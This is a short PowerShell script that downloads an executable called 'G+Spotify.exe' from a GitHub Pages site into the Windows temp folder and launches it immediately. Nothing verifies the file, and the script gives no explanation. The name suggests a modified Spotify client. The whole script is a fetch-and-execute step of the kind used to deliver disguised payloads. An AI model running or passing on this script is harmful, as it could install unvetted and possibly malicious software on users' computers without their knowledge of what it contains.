$url = "https://grafenotk.github.io/soft/G+Spotify.exe"
$output = "$env:Temp\G+Spotify.exe"
Invoke-WebRequest -Uri $url -OutFile $output
Start-Process $output
